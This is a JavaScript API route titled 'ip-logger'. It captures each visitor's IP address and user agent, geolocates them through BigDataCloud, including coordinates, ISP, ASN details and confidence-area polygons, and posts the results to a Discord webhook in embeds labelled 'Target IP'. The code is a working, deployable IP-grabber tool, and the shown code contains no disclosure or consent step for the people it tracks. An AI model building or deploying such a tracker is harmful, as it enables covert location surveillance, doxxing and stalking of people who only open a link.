// /pages/api/ip-logger.js - COMPLETE WITH ASN DATA & CONFIDENCE AREA DETAILS
export default async function handler(req, res) {
  // CORS headers
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.status(200).end();

  try {
    // --- Get Client IP ---
    let clientIP = (
      req.headers['x-forwarded-for'] ||
      req.headers['x-real-ip'] ||
      req.socket?.remoteAddress ||
      ''
    ).toString();
    if (!clientIP) clientIP = '0.0.0.0';
    if (clientIP.includes(',')) clientIP = clientIP.split(',')[0].trim();
    clientIP = clientIP.replace(/^::ffff:/, '');
    const userAgent = (req.headers['user-agent'] || 'Unknown').toString();

    console.log('DEBUG: Starting for IP:', clientIP);

    // --- API Key Check ---
    const KEY = process.env.BIGDATACLOUD_API_KEY;
    if (!KEY) {
      console.error('DEBUG: Missing BIGDATACLOUD_API_KEY');
      return res.status(500).json({ success: false, error: 'Missing BIGDATACLOUD_API_KEY' });
    }

    const BASE = 'https://api-bdc.net/data';
    
    // --- 1. Fetch Main Geolocation Data ---
    const GEO_URL = `${BASE}/ip-geolocation-full?ip=${encodeURIComponent(clientIP)}&localityLanguage=en&key=${KEY}`;
    
    let ipData = {};
    try {
      const response = await fetch(GEO_URL);
      if (!response.ok) {
        console.error(`DEBUG: Geolocation API error ${response.status}`);
        return res.status(502).json({ success: false, error: `API error: ${response.status}` });
      }
      
      const rawText = await response.text();
      ipData = JSON.parse(rawText);
      console.log('DEBUG: Main geolocation fetch OK');
    } catch (fetchError) {
      console.error('DEBUG: Geolocation fetch failed:', fetchError.message);
      return res.status(500).json({ success: false, error: 'Failed to fetch geolocation data' });
    }

    // --- 2. Fetch ASN Data if Available ---
    let asnData = {};
    const asnNumber = ipData?.network?.autonomousSystemNumber;
    
    if (asnNumber) {
      const ASN_URL = `${BASE}/asn-info-full?asn=AS${asnNumber}&localityLanguage=en&key=${KEY}`;
      console.log('DEBUG: Fetching ASN data from:', ASN_URL);
      
      try {
        const asnResponse = await fetch(ASN_URL);
        if (asnResponse.ok) {
          const asnText = await asnResponse.text();
          asnData = JSON.parse(asnText);
          console.log('DEBUG: ASN data fetched successfully, keys:', Object.keys(asnData));
        } else {
          console.warn('DEBUG: ASN API failed with status:', asnResponse.status);
        }
      } catch (asnError) {
        console.warn('DEBUG: ASN fetch error:', asnError.message);
      }
    } else {
      console.warn('DEBUG: No ASN number found in main response');
    }

    // --- Extract Main Location Data ---
    const latitude = ipData?.location?.latitude || null;
    const longitude = ipData?.location?.longitude || null;
    const continent = ipData?.location?.continent || 'Unknown';
    const region = ipData?.location?.principalSubdivision || 'Unknown';
    const city = ipData?.location?.city || 'Unknown';
    const locality = ipData?.location?.localityName || city;
    const country = ipData?.country?.name || 'Unknown';
    const countryCode = ipData?.country?.isoAlpha2 || 'Unknown';
    const callingCode = ipData?.country?.callingCode || '';
    const currency = ipData?.country?.currency?.code || '';
    
    // Use ASN data for network information (from the detailed ASN API)
    const isp = asnData?.organisation || ipData?.network?.organisation || 'Unknown';
    const asn = asnData?.asn || (asnNumber ? `AS${asnNumber}` : 'Unknown');
    const connectionType = ipData?.network?.connectionType || 'Unknown';
    
    const confidence = ipData?.confidence || 'unknown';
    const confidenceArea = ipData?.confidenceArea || null;
    const accuracyRadius = ipData?.location?.accuracyRadius || null;
    const timezone = ipData?.location?.timeZone?.ianaTimeId || 'Unknown';

    // --- Process Confidence Area Data ---
    let confidenceInfo = {
      hasData: false,
      rawCoordinates: [],
      pointCount: 0,
      validPointCount: 0,
      bounds: null,
      statistics: null
    };

    if (confidenceArea && Array.isArray(confidenceArea)) {
      try {
        confidenceInfo.hasData = true;
        confidenceInfo.pointCount = confidenceArea.length;
        
        // Process all coordinate points
        confidenceInfo.rawCoordinates = confidenceArea.map((point, index) => {
          if (Array.isArray(point) && point.length >= 2) {
            const lon = point[0];
            const lat = point[1];
            
            if (typeof lon === 'number' && typeof lat === 'number' && 
                !isNaN(lon) && !isNaN(lat)) {
              confidenceInfo.validPointCount++;
              return {
                index: index + 1,
                longitude: lon,
                latitude: lat,
                formatted: `[${lon.toFixed(6)}, ${lat.toFixed(6)}]`
              };
            }
          }
          return null;
        }).filter(point => point !== null);

        // Calculate bounds if we have valid points
        if (confidenceInfo.validPointCount > 0) {
          const lats = confidenceInfo.rawCoordinates.map(p => p.latitude);
          const lons = confidenceInfo.rawCoordinates.map(p => p.longitude);
          
          const minLat = Math.min(...lats);
          const maxLat = Math.max(...lats);
          const minLon = Math.min(...lons);
          const maxLon = Math.max(...lons);
          
          confidenceInfo.bounds = {
            minLat: minLat.toFixed(6),
            maxLat: maxLat.toFixed(6),
            minLon: minLon.toFixed(6),
            maxLon: maxLon.toFixed(6),
            latRange: (maxLat - minLat).toFixed(6),
            lonRange: (maxLon - minLon).toFixed(6)
          };

          // Calculate area statistics
          const latKm = (maxLat - minLat) * 111.32;
          const avgLat = (minLat + maxLat) / 2;
          const lonKm = (maxLon - minLon) * (111.32 * Math.cos(avgLat * Math.PI / 180));
          const areaKm = Math.abs(latKm * lonKm);
          
          confidenceInfo.statistics = {
            centerLat: ((minLat + maxLat) / 2).toFixed(6),
            centerLon: ((minLon + maxLon) / 2).toFixed(6),
            areaKm2: areaKm.toFixed(2),
            widthKm: lonKm.toFixed(2),
            heightKm: latKm.toFixed(2)
          };
        }
        
        console.log('DEBUG: Processed', confidenceInfo.validPointCount, 'confidence area points');
      } catch (error) {
        console.error('DEBUG: Error processing confidence area:', error.message);
        confidenceInfo.error = error.message;
      }
    }

    // --- Build Data Objects ---
    const mainData = {
      ip: clientIP,
      timestamp: new Date().toISOString(),
      userAgent,
      location: {
        continent,
        country,
        countryCode,
        region,
        city,
        locality,
        latitude,
        longitude,
        accuracyRadius,
        confidence
      },
      network: {
        // From ASN API (detailed)
        asn: asn,
        organisation: asnData?.organisation || 'Unknown',
        registry: asnData?.registry || 'Unknown',
        registeredCountry: asnData?.registeredCountryName || 'Unknown',
        registrationDate: asnData?.registrationLastChange || 'Unknown',
        totalIpv4Addresses: asnData?.totalIpv4Addresses || 0,
        totalIpv6Prefixes: asnData?.totalIpv6Prefixes || 0,
        rank: asnData?.rankText || 'Unknown',
        // From main API
        connectionType: connectionType,
        isp: isp
      },
      timezone: {
        name: timezone
      },
      confidenceArea: {
        hasData: confidenceInfo.hasData,
        pointCount: confidenceInfo.pointCount,
        validPoints: confidenceInfo.validPointCount
      }
    };

    console.log('DEBUG: Main data ready, ASN:', mainData.network.asn);

    // --- Send Discord Webhooks ---
    const webhookResults = {
      main: { sent: false, error: null },
      confidence: { sent: false, error: null },
      asnDetails: { sent: false, error: null }
    };

    const DISCORD_WEBHOOK = process.env.DISCORD_WEBHOOK_URL;
    if (DISCORD_WEBHOOK) {
      try {
        // 1. Send MAIN webhook with location and basic ASN
        await sendMainWebhook(mainData, DISCORD_WEBHOOK);
        webhookResults.main.sent = true;
        console.log('DEBUG: Main webhook sent');
        
        // 2. Send ASN DETAILS webhook if we have ASN data
        if (asnData && Object.keys(asnData).length > 0) {
          try {
            await sendAsnDetailsWebhook(mainData, asnData, DISCORD_WEBHOOK);
            webhookResults.asnDetails.sent = true;
            console.log('DEBUG: ASN details webhook sent');
          } catch (asnError) {
            webhookResults.asnDetails.error = asnError.message;
            console.error('DEBUG: ASN webhook failed:', asnError.message);
          }
        }
        
        // 3. Send CONFIDENCE AREA webhook if we have confidence data
        if (confidenceInfo.hasData && confidenceInfo.validPointCount > 0) {
          try {
            await sendConfidenceAreaWebhooks(mainData, confidenceInfo, DISCORD_WEBHOOK);
            webhookResults.confidence.sent = true;
            console.log('DEBUG: Confidence area webhooks sent');
          } catch (confError) {
            webhookResults.confidence.error = confError.message;
            console.error('DEBUG: Confidence webhook failed:', confError.message);
          }
        }
        
      } catch (mainError) {
        webhookResults.main.error = mainError.message;
        console.error('DEBUG: Main webhook failed:', mainError.message);
      }
    } else {
      console.warn('DEBUG: No DISCORD_WEBHOOK_URL set');
    }

    // --- Return Response ---
    return res.status(200).json({
      success: true,
      data: {
        ip: clientIP,
        location: mainData.location,
        network: mainData.network,
        confidenceArea: {
          hasData: confidenceInfo.hasData,
          totalPoints: confidenceInfo.pointCount,
          validPoints: confidenceInfo.validPointCount,
          bounds: confidenceInfo.bounds,
          statistics: confidenceInfo.statistics
        }
      },
      webhooks: webhookResults
    });

  } catch (err) {
    console.error('Handler error:', err);
    return res.status(500).json({ 
      success: false, 
      error: 'Internal server error',
      message: err.message
    });
  }
}

// --- Helper Functions ---

function parseUserAgent(ua) {
  const s = (ua || '').toString();
  let browser = 'Unknown', os = 'Unknown', device = 'Desktop';
  
  if (/OPR|Opera/.test(s)) browser = 'Opera';
  else if (/Edg\//.test(s)) browser = 'Edge';
  else if (/Chrome\/\d+/i.test(s) && !/Edg\//i.test(s)) browser = 'Chrome';
  else if (/Firefox\/\d+/i.test(s)) browser = 'Firefox';
  else if (/Safari\/\d+/i.test(s) && !/Chrome\//i.test(s)) browser = 'Safari';
  
  if (/\bWindows\b/i.test(s)) os = 'Windows';
  else if (/\bMacintosh\b|\bMac OS\b/i.test(s)) os = 'Mac OS';
  else if (/\bAndroid\b/i.test(s)) os = 'Android';
  else if (/\b(iPhone|iPad|iPod)\b/i.test(s)) os = 'iOS';
  else if (/\bLinux\b/i.test(s)) os = 'Linux';
  
  if (/\bMobile\b/i.test(s) || (/Android/i.test(s) && /Mobile/i.test(s))) device = 'Mobile';
  else if (/\bTablet\b/i.test(s) || /iPad/i.test(s)) device = 'Tablet';
  
  return { browser, os, device, raw: s.substring(0, 150) };
}

// --- Webhook 1: MAIN LOCATION & BASIC ASN ---
async function sendMainWebhook(data, webhookUrl) {
  const embed = {
    embeds: [{
      title: '🌐 IP Location Report',
      color: 0x3498db,
      timestamp: data.timestamp,
      fields: [
        { 
          name: '📍 IP Address', 
          value: `\`${data.ip}\``, 
          inline: false 
        },
        { 
          name: '🌍 Continent', 
          value: data.location.continent,
          inline: true 
        },
        { 
          name: '🇮🇳 Country', 
          value: `${data.location.country} (${data.location.countryCode})`,
          inline: true 
        },
        { 
          name: '🏙️ Region', 
          value: data.location.region,
          inline: true 
        },
        { 
          name: '🏙️ City', 
          value: data.location.city,
          inline: true 
        },
        { 
          name: '📍 Locality', 
          value: data.location.locality,
          inline: true 
        },
        { 
          name: '🎯 Coordinates', 
          value: `${data.location.latitude}, ${data.location.longitude}`,
          inline: true 
        },
        { 
          name: '📏 Accuracy Radius', 
          value: data.location.accuracyRadius ? `${data.location.accuracyRadius} km` : 'N/A',
          inline: true 
        },
        { 
          name: '✅ Confidence Level', 
          value: data.location.confidence.toUpperCase(),
          inline: true 
        },
        { 
          name: '🔢 ASN', 
          value: data.network.asn,
          inline: true 
        },
        { 
          name: '🏢 Organization', 
          value: data.network.organisation,
          inline: true 
        },
        { 
          name: '📡 Connection Type', 
          value: data.network.connectionType,
          inline: true 
        },
        { 
          name: '🕒 Timezone', 
          value: data.timezone.name,
          inline: true 
        },
        { 
          name: '🖥️ Device', 
          value: `${parseUserAgent(data.userAgent).browser} / ${parseUserAgent(data.userAgent).os}`,
          inline: true 
        }
      ],
      footer: { 
        text: 'Main Report • See next messages for ASN details and confidence area'
      }
    }]
  };

  const response = await fetch(webhookUrl, { 
    method: 'POST', 
    headers: { 'Content-Type': 'application/json' }, 
    body: JSON.stringify(embed)
  });
  
  if (!response.ok) {
    const errorText = await response.text();
    throw new Error(`Discord API: ${response.status}`);
  }
}

// --- Webhook 2: ASN DETAILS (from asn-info-full API) ---
async function sendAsnDetailsWebhook(mainData, asnData, webhookUrl) {
  const fields = [
    { 
      name: '📍 Target IP', 
      value: `\`${mainData.ip}\``, 
      inline: false 
    },
    { 
      name: '🔢 ASN', 
      value: asnData.asn || 'N/A',
      inline: true 
    },
    { 
      name: '🔢 ASN Numeric', 
      value: asnData.asnNumeric ? String(asnData.asnNumeric) : 'N/A',
      inline: true 
    },
    { 
      name: '🏢 Organization', 
      value: asnData.organisation || 'N/A',
      inline: true 
    },
    { 
      name: '🏷️ Name', 
      value: asnData.name || 'N/A',
      inline: true 
    },
    { 
      name: '📋 Registry', 
      value: asnData.registry || 'N/A',
      inline: true 
    },
    { 
      name: '🇮🇳 Registered Country', 
      value: asnData.registeredCountryName || 'N/A',
      inline: true 
    },
    { 
      name: '📅 Registration Date', 
      value: asnData.registrationLastChange || 'N/A',
      inline: true 
    },
    { 
      name: '📊 IPv4 Addresses', 
      value: asnData.totalIpv4Addresses ? asnData.totalIpv4Addresses.toLocaleString() : '0',
      inline: true 
    },
    { 
      name: '📊 IPv4 Prefixes', 
      value: asnData.totalIpv4Prefixes ? String(asnData.totalIpv4Prefixes) : '0',
      inline: true 
    },
    { 
      name: '📊 IPv6 Prefixes', 
      value: asnData.totalIpv6Prefixes ? String(asnData.totalIpv6Prefixes) : '0',
      inline: true 
    },
    { 
      name: '🏆 Rank', 
      value: asnData.rankText || 'N/A',
      inline: true 
    },
    { 
      name: '🔗 Total Receiving From', 
      value: asnData.totalReceivingFrom ? String(asnData.totalReceivingFrom) : '0',
      inline: true 
    },
    { 
      name: '🔗 Total Transit To', 
      value: asnData.totalTransitTo ? String(asnData.totalTransitTo) : '0',
      inline: true 
    }
  ];

  const embed = {
    embeds: [{
      title: '📡 ASN Detailed Information',
      description: `Complete ASN data for ${mainData.ip}`,
      color: 0x2ecc71, // Green color
      timestamp: mainData.timestamp,
      fields: fields,
      footer: { 
        text: 'ASN Details • From BigDataCloud asn-info-full API'
      }
    }]
  };

  const response = await fetch(webhookUrl, { 
    method: 'POST', 
    headers: { 'Content-Type': 'application/json' }, 
    body: JSON.stringify(embed)
  });
  
  if (!response.ok) {
    const errorText = await response.text();
    throw new Error(`Discord API: ${response.status}`);
  }
}

// --- Webhook 3: CONFIDENCE AREA DATA (multiple messages if needed) ---
async function sendConfidenceAreaWebhooks(mainData, confidenceInfo, webhookUrl) {
  const totalPoints = confidenceInfo.rawCoordinates.length;
  
  // Part 1: Confidence Area Statistics
  const statsEmbed = {
    embeds: [{
      title: '📊 Confidence Area Analysis - Part 1: Statistics',
      description: `Confidence analysis for IP: \`${mainData.ip}\``,
      color: 0x9b59b6, // Purple color
      timestamp: mainData.timestamp,
      fields: [
        { 
          name: '🎯 Confidence Level', 
          value: mainData.location.confidence.toUpperCase(),
          inline: true 
        },
        { 
          name: '📐 Total Points', 
          value: String(confidenceInfo.pointCount),
          inline: true 
        },
        { 
          name: '✅ Valid Points', 
          value: String(confidenceInfo.validPointCount),
          inline: true 
        },
        { 
          name: '📏 Data Quality', 
          value: `${((confidenceInfo.validPointCount / confidenceInfo.pointCount) * 100).toFixed(1)}%`,
          inline: true 
        }
      ],
      footer: { 
        text: 'Confidence Area Analysis Part 1 of 3'
      }
    }]
  };

  // Add bounds if available
  if (confidenceInfo.bounds) {
    statsEmbed.embeds[0].fields.push(
      { 
        name: '📍 Bounding Box - Min', 
        value: `Lat: ${confidenceInfo.bounds.minLat}°\nLon: ${confidenceInfo.bounds.minLon}°`,
        inline: true 
      },
      { 
        name: '📍 Bounding Box - Max', 
        value: `Lat: ${confidenceInfo.bounds.maxLat}°\nLon: ${confidenceInfo.bounds.maxLon}°`,
        inline: true 
      },
      { 
        name: '📏 Ranges', 
        value: `Lat: ${confidenceInfo.bounds.latRange}°\nLon: ${confidenceInfo.bounds.lonRange}°`,
        inline: true 
      }
    );
  }

  // Add statistics if available
  if (confidenceInfo.statistics) {
    statsEmbed.embeds[0].fields.push(
      { 
        name: '📍 Calculated Center', 
        value: `${confidenceInfo.statistics.centerLat}°, ${confidenceInfo.statistics.centerLon}°`,
        inline: true 
      },
      { 
        name: '📐 Area Dimensions', 
        value: `Width: ${confidenceInfo.statistics.widthKm} km\nHeight: ${confidenceInfo.statistics.heightKm} km`,
        inline: true 
      },
      { 
        name: '📏 Area Size', 
        value: `${confidenceInfo.statistics.areaKm2} km²`,
        inline: true 
      }
    );
  }

  // Send Part 1
  await fetch(webhookUrl, { 
    method: 'POST', 
    headers: { 'Content-Type': 'application/json' }, 
    body: JSON.stringify(statsEmbed)
  });

  // Part 2: First 15 Coordinate Points
  if (totalPoints > 0) {
    const batch1 = confidenceInfo.rawCoordinates.slice(0, Math.min(15, totalPoints));
    const coordEmbed1 = {
      embeds: [{
        title: `📊 Confidence Area - Part 2: Coordinates 1-${batch1.length}`,
        description: `Coordinate points [Longitude, Latitude] for ${mainData.ip}`,
        color: 0xe74c3c, // Red color
        timestamp: mainData.timestamp,
        fields: [],
        footer: { 
          text: `Confidence Area Analysis Part 2 of 3 • Format: [Lon, Lat]`
        }
      }]
    };

        // Add coordinates in groups of 5
    for (let i = 0; i < batch1.length; i += 5) {
      const group = batch1.slice(i, i + 5);
      const coordText = group.map(p => `${p.index}. ${p.formatted}`).join('\n');
      coordEmbed1.embeds[0].fields.push({
        name: `Points ${i + 1}-${i + group.length}`,
        value: `\`\`\`${coordText}\`\`\``,
        inline: false
      });
    }

    // Send Part 2
    await fetch(webhookUrl, { 
      method: 'POST', 
      headers: { 'Content-Type': 'application/json' }, 
      body: JSON.stringify(coordEmbed1)
    });

    // Part 3: More coordinates if available
    if (totalPoints > 15) {
      const batch2 = confidenceInfo.rawCoordinates.slice(15, Math.min(30, totalPoints));
      const coordEmbed2 = {
        embeds: [{
          title: `📊 Confidence Area - Part 3: Coordinates 16-${15 + batch2.length}`,
          description: `Additional coordinate points for ${mainData.ip}`,
          color: 0xf39c12, // Orange color
          timestamp: mainData.timestamp,
          fields: [],
          footer: { 
            text: `Confidence Area Analysis Part 3 of 3 • Showing ${batch2.length} of ${totalPoints} total points`
          }
        }]
      };

      // Add coordinates in groups of 5
      for (let i = 0; i < batch2.length; i += 5) {
        const group = batch2.slice(i, i + 5);
        const coordText = group.map(p => `${p.index}. ${p.formatted}`).join('\n');
        coordEmbed2.embeds[0].fields.push({
          name: `Points ${i + 16}-${i + 16 + group.length - 1}`,
          value: `\`\`\`${coordText}\`\`\``,
          inline: false
        });
      }

      // Add note if there are more points
      if (totalPoints > 30) {
        coordEmbed2.embeds[0].fields.push({
          name: '📝 Note',
          value: `${totalPoints - 30} additional coordinate points not shown\nTotal polygon has ${totalPoints} points`,
          inline: false
        });
      }

      // Send Part 3
      await fetch(webhookUrl, { 
        method: 'POST', 
        headers: { 'Content-Type': 'application/json' }, 
        body: JSON.stringify(coordEmbed2)
      });
    }
  }
}
